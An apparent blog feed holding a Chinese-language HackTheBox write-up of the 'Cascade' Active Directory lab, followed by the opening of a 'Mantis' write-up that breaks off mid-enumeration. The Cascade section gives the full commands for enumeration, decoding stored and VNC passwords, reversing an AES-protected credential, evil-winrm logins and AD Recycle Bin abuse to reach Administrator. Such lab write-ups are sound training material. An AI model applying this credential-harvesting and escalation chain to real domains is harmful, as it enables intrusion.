    <id>https://www.fomal.cc/posts/7112d8f8.html</id>
    <published>2024-07-22T03:04:22.000Z</published>
    <updated>2024-10-12T11:00:52.189Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.10.182</p><p>攻击机ip：10.10.14.16</p></blockquote><h1>知识点</h1><ul><li>TightVNC密码破解</li><li>AD Recycle Bin滥用权限提升</li></ul><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><p><code>nmap -sS -sV -sC -p- 10.10.10.182</code></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-22 11:27 CST</span><br><span class="line">Nmap scan report for 10.10.10.182</span><br><span class="line">Host is up (0.45s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE    SERVICE        VERSION</span><br><span class="line">53/tcp    open     domain         Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)</span><br><span class="line">| dns-nsid:</span><br><span class="line">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)</span><br><span class="line">88/tcp    open     kerberos-sec   Microsoft Windows Kerberos (server time: 2024-07-22 03:28:03Z)</span><br><span class="line">135/tcp   open     msrpc          Microsoft Windows RPC</span><br><span class="line">389/tcp   open     ldap           Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open     microsoft-ds?</span><br><span class="line">464/tcp   filtered kpasswd5</span><br><span class="line">593/tcp   filtered http-rpc-epmap</span><br><span class="line">636/tcp   open     tcpwrapped</span><br><span class="line">1337/tcp  filtered waste</span><br><span class="line">1433/tcp  filtered ms-sql-s</span><br><span class="line">3268/tcp  open     ldap           Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open     tcpwrapped</span><br><span class="line">5722/tcp  filtered msdfsr</span><br><span class="line">5985/tcp  open     http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">8080/tcp  filtered http-proxy</span><br><span class="line">9389/tcp  filtered adws</span><br><span class="line">47001/tcp filtered winrm</span><br><span class="line">49152/tcp filtered unknown</span><br><span class="line">49153/tcp filtered unknown</span><br><span class="line">49154/tcp open     msrpc          Microsoft Windows RPC</span><br><span class="line">49155/tcp open     msrpc          Microsoft Windows RPC</span><br><span class="line">49157/tcp open     ncacn_http     Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49158/tcp open     msrpc          Microsoft Windows RPC</span><br><span class="line">49167/tcp filtered unknown</span><br><span class="line">49172/tcp filtered unknown</span><br><span class="line">49173/tcp filtered unknown</span><br><span class="line">50255/tcp filtered unknown</span><br><span class="line">Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: -1s</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2:1:0:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-07-22T03:28:58</span><br><span class="line">|_  start_date: 2024-07-22T03:07:52</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 130.17 seconds</span><br></pre></td></tr></table></figure><p>从上述结果中可以发现，主机为<code>windows_server_2008</code>，域名是<code>cascade.local</code>，开启的服务有<code>DNS</code>服务、<code>Kerberos</code>服务、<code>rpc</code>服务、<code>ldap</code>服务、<code>SMB</code>服务、在<code>1433</code>端口上运行着<code>SQL Server</code>、在<code>8080</code>端口也有服务，但是大多数服务都被防火墙过滤了</p><h2 id="SMB">SMB</h2><p>直接测试smb能不能匿名登录</p><p><code>smbclient -N -L //10.10.10.182</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722141009245-1281612221.png" alt="image-20240722140947016"></p><p>能成功登录但是获得不了什么重要的信息</p><h2 id="rpc">rpc</h2><p><code>rpc</code>看看能不能获取一些信息</p><p><code>rpcclient -U &quot;&quot; -N 10.10.10.182</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722141314680-1424103600.png" alt="image-20240722141252468"></p><p>发现能获得一些用户名</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">CascGuest</span><br><span class="line">arksvc</span><br><span class="line">s.smith</span><br><span class="line">r.thompson</span><br><span class="line">util</span><br><span class="line">j.wakefield</span><br><span class="line">s.hickson</span><br><span class="line">j.goodhand</span><br><span class="line">a.turnbull</span><br><span class="line">e.crowe</span><br><span class="line">b.hanson</span><br><span class="line">d.burman</span><br><span class="line">BackupSvc</span><br><span class="line">j.allen</span><br><span class="line">i.croft</span><br></pre></td></tr></table></figure><h2 id="ldap">ldap</h2><p>用<code>ldapsearch</code>测试一下</p><p><code>ldapsearch -x -b &quot;dc=cascade,dc=local&quot; -H ldap://10.10.10.182</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722150135151-525710537.png" alt="image-20240722150112607"></p><p>找到<code>Ryan Thompson</code>在<code>Cascade</code>上的用户名是<code>r.thompson</code>，这个名字之前<code>rpc</code>枚举出来过，同时发现在``Ryan Thompson用户的最后一个数据项中有<code>cascadeLegacyPwd</code>数据，将其值<code>clk0bjVldmE=</code>进行解码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722145836886-812006840.png" alt="image-20240722145814808"></p><p>得到解密后的数据<code>rY4n5eva</code>，疑似<code>r.thompson</code>的密码</p><p>提交后发现这真是<code>Ryan Thompson</code>的密码</p><p>测试能不能连接</p><p><code>crackmapexec smb 10.10.10.182 -u r.thompson -p rY4n5eva</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722150712665-1667520013.png" alt="image-20240722150650469"></p><h2 id="r-thompson-SMB">r.thompson-SMB</h2><p>发现可以进行<code>smb</code>连接，用<code>smbmap</code>连接一下</p><p><code>smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722153218137-609195675.png" alt="image-20240722153155560"></p><p>通过 <code>smbmap</code> 可以看到，我们只对 <code>Data</code> 目录具有可读权限，尝试连接</p><p><code>smbclient \\\\10.10.10.182\\Data -U r.thompson</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722153846790-786836942.png" alt="image-20240722153817069"></p><p>测试后发现只对<code>IT</code>目录有访问权限，将文件下载到本地进行观察</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">smb: \&gt; mask <span class="string">&quot;&quot;</span></span><br><span class="line">smb: \&gt; recurse ON <span class="comment">#默认情况下递归选项是OFF,在 smb 提示符下输入 recurse ON命令会将此选项切换为ON</span></span><br><span class="line">smb: \&gt; prompt OFF <span class="comment">#默认情况下询问是否下载选项是ON,在 smb 提示符下输入prompt OFF命令会将此选项切换为OFF</span></span><br><span class="line">smb: \&gt; mget *<span class="comment">#此时可以在不询问的情况下递归下载data目录下的所有文件</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722162504399-800993694.png" alt="image-20240722162438200"></p><h1>共享文件夹Data分析</h1><h2 id="破解TightVNC密码">破解TightVNC密码</h2><p>在查找文件时，发现在<code>IT/Temp/s.smith</code>目录的<code>Install.reg</code>文件中找到了一个vnc密码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722164045214-1255540472.png" alt="image-20240722164021239"></p><p><code>&quot;Password&quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f</code></p><p>正常的<code>hex</code>解密是解不出来的，去网上找一下<code>vnc</code>解密的工具</p><p><a href="https://github.com/jeroennijhof/vncpwd">vncpwd</a></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722184121545-909779804.png" alt="image-20240722184058650"></p><p>解密完成，发现明文密码<code>sT333ve2</code>，猜测是<code>s.smith</code>用户的</p><h2 id="临时账户TempAdmin">临时账户TempAdmin</h2><p>在<code>/Data/IT/Email Archives/</code>目录下找到个文件<code>Meeting_Notes_June_2018.html</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722185451609-2123011953.png" alt="image-20240722185428846"></p><p>从邮件中，可以获取到的有效信息是，环境迁移时会使用临时账户<code>TempAdmin</code>，并且密码与常规<code>admin</code>密码相同,当环境迁移结束后会删除临时账户。</p><p>在<code>/Data/IT/Logs/Ark AD Recycle Bin</code>目录下发现<code>ArkAdRecycleBin.log</code>日志文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723104039743-140522147.png" alt="image-20240723104034284"></p><p>从日志中我们发现<code>TempAdmin</code>帐户已移至回收站</p><h1>横向移动</h1><h2 id="登录s-smith用户">登录s.smith用户</h2><p>先利用<code>crackmapexec</code>测试能否通过<code>evil-winrm</code>登录<code>s.smith</code>用户</p><p><code>crackmapexec winrm 10.10.10.182 -u s.smith -p sT333ve2</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722190053646-898096504.png" alt="image-20240722190031059"></p><p>测试发现的确可以使用密码：<code>sT333ve2</code>通过<code>winRM</code>用<code>s.smith</code>账号进行远程登录</p><p><code>evil-winrm -u s.smith -p 'sT333ve2' -i 10.10.10.182</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722191054897-647149480.png" alt="image-20240722191053738"></p><p>成功登录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722191134005-826162699.png" alt="image-20240722191133301"></p><p>在<code>s.smith</code>的<code>Desktop</code>目录找到<code>user.txt</code></p><p>同时发现一个可疑的软链接文件<code>WinDirStat.lnk</code></p><p>查看一下该用户所在组信息</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722192914972-506642969.png" alt="image-20240722192913858"></p><p>发现该用户并不在权限组中，但是发现该用户属于<code>Audit Share</code>组，接下来就可以访问<code>Audit</code>目录下的文件进行查看</p><h2 id="s-smith-SMB">s.smith-SMB</h2><p>访问<code>Audit</code>目录</p><p><code>smbclient \\\\10.10.10.182\\Audit$ -U s.smith</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722194201797-1094652226.png" alt="image-20240722194200709"></p><p>登陆成功，还是老办法，将文件下载到本地查看</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">smb: \&gt; mask <span class="string">&quot;&quot;</span></span><br><span class="line">smb: \&gt; recurse ON <span class="comment">#默认情况下递归选项是OFF,在 smb 提示符下输入 recurse ON命令会将此选项切换为ON</span></span><br><span class="line">smb: \&gt; prompt OFF <span class="comment">#默认情况下询问是否下载选项是ON,在 smb 提示符下输入prompt OFF命令会将此选项切换为OFF</span></span><br><span class="line">smb: \&gt; mget *<span class="comment">#此时可以在不询问的情况下递归下载data目录下的所有文件</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722194913997-1071312517.png" alt="image-20240722194912751"></p><p>下载完成</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722195141176-321662553.png" alt="image-20240722195139213"></p><h2 id="Audit-db">Audit.db</h2><p>首先就是在<code>DB</code>目录下找到数据库，试试能不能获取一些有用的信息</p><p><code>sqlite3 Audit.db</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722200725849-1056528410.png" alt="image-20240722200724571"></p><p>只能从<code>Ldap</code>表中找到<code>Arksvc</code>用户名，密码破解不了</p><h2 id="CascAudit-exe文件分析">CascAudit.exe文件分析</h2><p>继续看<code>Audit</code>目录下的文件，先看那个<code>.bat</code>文件</p><p><code>cat RunAudit.bat</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722200948420-1914062784.png" alt="image-20240722200947578"></p><p>发现<code>CascAudit.exe</code>以 <code>db</code> 文件作为参数运行，查看一下<code>CascAudit.exe</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722201149933-116365236.png" alt="image-20240722201149317"></p><p>发现这是一个<code>.NET</code>的文件，利用工具调试一下</p><p><a href="https://github.com/dnSpy/dnSpy/releases">dnSpy</a></p><p>把所属文件夹<code>dump</code>下来丢进<code>dnspy</code>动调一下，把断点打在断开数据库连接的地方想劫持一下<code>password</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722211926047-1402503370.png" alt="image-20240722211925250"></p><p>但是这块儿可能是我的<code>dnspy</code>有问题，一直卡在一个报错上了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722211944190-800938387.png" alt="image-20240722211943214"></p><p>索性直接逆，按照它的逻辑去找<code>password</code>加密的地方，双击跟进这个加密</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722211956255-771745297.png" alt="image-20240722211955684"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722212000049-1187622322.png" alt="image-20240722211959240"></p><p>明显的<code>AES</code>加密，给了秘钥和<code>iv</code>直接找个在线网站解了（注意先用<code>base64</code>解码）</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722212036892-763850826.png" alt="image-20240722212036170"></p><p>这样我们就拿到了<code>Arksvc</code>的密码<code>w3lc0meFr31nd</code></p><p>拿到用户名密码，测试一下能不能<code>winrm</code>登录</p><p><code>crackmapexec winrm 10.10.10.182 -u Arksvc -p w3lc0meFr31nd</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722212516783-401250117.png" alt="image-20240722212515703"></p><p>可以登录，拿<code>evil-winrm</code>登录</p><p><code>evil-winrm -i 10.10.10.182 -u Arksvc -p w3lc0meFr31nd</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722212621095-1069117083.png" alt="image-20240722212620250"></p><p>登陆成功</p><h1>AD Recycle Bin滥用权限提升</h1><p>先看<code>Arksvc</code>用户有没有什么可以利用的权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723100622343-929767262.png" alt="image-20240723100620239"></p><p>发现该用户属于 <code>AD Recycle Bin</code> 组下</p><blockquote><p>该组是用于恢复被删除的用户，组以及OU等对象的，这些对象在 <code>AD Recycle Bin</code> 中时保持其所有属性不变，这使得它们可以在任何时候被恢复。</p><p><a href="https://blog.netwrix.com/2021/11/30/active-directory-object-recovery-recycle-bin/">参考链接</a></p></blockquote><p>前面已经知道两个重要信息，一个是管理员用户和<code>TempAdmin</code>密码一致，另一个是TempAdmin被移到了回收站</p><p>这里可以使用<code>Get-ADObject</code>枚举<code>AD</code>回收站中的对象，并过滤具有<code>isDeleted</code>属性的已删除对象即可</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADObject</span> <span class="literal">-filter</span> <span class="string">&#x27;isDeleted -eq $true -and name -ne &quot;Deleted Objects&quot;&#x27;</span> <span class="literal">-includeDeletedObjects</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723105119052-1568759036.png" alt="image-20240723105115495"></p><p>发现最后一条数据是我们之前提到的<code>TempAdmin</code>，获取该帐户的所有详细信息</p><p><code>Get-ADObject -filter &#123; SAMAccountName -eq &quot;TempAdmin&quot; &#125; -includeDeletedObjects -property *</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723105313412-659440464.png" alt="image-20240723105310378"></p><p>注意到密码值很可能是<code>base64</code>编码，解码一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723105357920-613810809.png" alt="image-20240723105356090"></p><p>获取<code>TempAdmin</code>的明文密码：<code>baCT3r1aN00dles</code></p><p>因为之前提到过<code>TempAdmin</code>的密码跟正常管理员密码一样，所以我们直接测试能否使用这个密码远程登陆<code>Administrator</code></p><p><code>crackmapexec winrm 10.10.10.182 -u Administrator -p baCT3r1aN00dles</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723105753291-1398855670.png" alt="image-20240723105748085"></p><p>发现可以登录，我们直接登录<code>Administrator</code></p><p><code>evil-winrm -i 10.10.10.182 -u Administrator -p baCT3r1aN00dles</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723105924743-1476469846.png" alt="image-20240723105922917"></p><p>登陆成功！</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723110506025-2001758700.png" alt="image-20240723110503914"></p><p>最后在<code>Desktop</code>目录找到<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">HackTheBox篇域渗透系列之Cascade</summary>
    
    
    
    <category term="HackTheBox" scheme="https://www.fomal.cc/categories/HackTheBox/"/>
    
    
    <category term="HTB" scheme="https://www.fomal.cc/tags/HTB/"/>
    
    <category term="域渗透" scheme="https://www.fomal.cc/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Mantis</title>
    <link href="https://www.fomal.cc/posts/662d550f.html"/>
    <id>https://www.fomal.cc/posts/662d550f.html</id>
    <published>2024-07-18T07:11:31.000Z</published>
    <updated>2024-10-12T11:01:01.248Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.10.52</p><p>攻击机ip：10.10.14.16</p></blockquote><h1>知识点</h1><ul><li>MS14-068权限提升</li></ul><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><p><code>nmap -sS -sV -sC -p- 10.10.10.52</code></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-18 21:03 CST</span><br><span class="line">Nmap scan report for 10.10.10.52</span><br><span class="line">Host is up (0.41s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)</span><br><span class="line">| dns-nsid:</span><br><span class="line">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)</span><br><span class="line">88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-07-18 13:03:51Z)</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">1337/tcp  open  http         Microsoft IIS httpd 7.5</span><br><span class="line">|_http-server-header: Microsoft-IIS/7.5</span><br><span class="line">|_http-title: IIS7</span><br><span class="line">1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM</span><br><span class="line">| ms-sql-ntlm-info:</span><br><span class="line">|   10.10.10.52:1433:</span><br><span class="line">|     Target_Name: HTB</span><br><span class="line">|     NetBIOS_Domain_Name: HTB</span><br><span class="line">|     NetBIOS_Computer_Name: MANTIS</span><br><span class="line">|     DNS_Domain_Name: htb.local</span><br><span class="line">|     DNS_Computer_Name: mantis.htb.local</span><br><span class="line">|     DNS_Tree_Name: htb.local</span><br><span class="line">|_    Product_Version: 6.1.7601</span><br><span class="line">|_ssl-date: 2024-07-18T13:05:06+00:00; -3s from scanner time.</span><br><span class="line">| ms-sql-info:</span><br><span class="line">|   10.10.10.52:1433:</span><br><span class="line">|     Version:</span><br><span class="line">|       name: Microsoft SQL Server 2014 RTM</span><br><span class="line">|       number: 12.00.2000.00</span><br><span class="line">|       Product: Microsoft SQL Server 2014</span><br><span class="line">|       Service pack level: RTM</span><br><span class="line">|       Post-SP patches applied: false</span><br><span class="line">|_    TCP port: 1433</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2024-07-18T13:00:53</span><br><span class="line">|_Not valid after:  2054-07-18T13:00:53</span><br><span class="line">3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">5722/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">8080/tcp  open  http         Microsoft IIS httpd 7.5</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-title: Tossed Salad - Blog</span><br><span class="line">|_http-server-header: Microsoft-IIS/7.5</span><br><span class="line">9389/tcp  open  mc-nmf       .NET Message Framing</span><br><span class="line">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49158/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49167/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49176/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49182/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">50255/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM</span><br><span class="line">| ms-sql-ntlm-info:</span><br><span class="line">|   10.10.10.52:50255:</span><br><span class="line">|     Target_Name: HTB</span><br><span class="line">|     NetBIOS_Domain_Name: HTB</span><br><span class="line">|     NetBIOS_Computer_Name: MANTIS</span><br><span class="line">|     DNS_Domain_Name: htb.local</span><br><span class="line">|     DNS_Computer_Name: mantis.htb.local</span><br><span class="line">|     DNS_Tree_Name: htb.local</span><br><span class="line">|_    Product_Version: 6.1.7601</span><br><span class="line">| ms-sql-info:</span><br><span class="line">|   10.10.10.52:50255:</span><br><span class="line">|     Version:</span><br><span class="line">|       name: Microsoft SQL Server 2014 RTM</span><br><span class="line">|       number: 12.00.2000.00</span><br><span class="line">|       Product: Microsoft SQL Server 2014</span><br><span class="line">|       Service pack level: RTM</span><br><span class="line">|       Post-SP patches applied: false</span><br><span class="line">|_    TCP port: 50255</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2024-07-18T13:00:53</span><br><span class="line">|_Not valid after:  2054-07-18T13:00:53</span><br><span class="line">|_ssl-date: 2024-07-18T13:05:06+00:00; -3s from scanner time.</span><br><span class="line">Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 34m15s, deviation: 1h30m45s, median: -3s</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2:1:0:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-07-18T13:04:48</span><br><span class="line">|_  start_date: 2024-07-18T13:00:29</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1</span><br><span class="line">|   Computer name: mantis</span><br><span class="line">|   NetBIOS computer name: MANTIS\x00</span><br><span class="line">|   Domain name: htb.local</span><br><span class="line">|   Forest name: htb.local</span><br><span class="line">|   FQDN: mantis.htb.local</span><br><span class="line">|_  System time: 2024-07-18T09:04:52-04:00</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 110.51 seconds</span><br></pre></td></tr></table></figure><p>有<code>DNS</code>服务、<code>Kerberos</code>服务、<code>ldap</code>服务、<code>SMB</code>服务、在<code>1337</code>端口有<code>http</code>服务、在<code>1433</code> 端口上有<code>SQL Server</code>服务，域名为<code>mantis.htb.local</code>，<code>8080</code>端口上还有<code>http</code>服务，应该是个<code>Blog</code>，还有其他等多个端口。</p><h2 id="ldap">ldap</h2><p><code>ldapsearch -x -H ldap://10.10.10.52:389 -s base -b &quot;&quot; namingcontexts</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240718154746434-704756932.png" alt="image-20240718154737592"></p><p>没什么重要的信息</p><h2 id="SMB">SMB</h2><p><code>smbclient -L //10.10.10.52</code></p><p><img 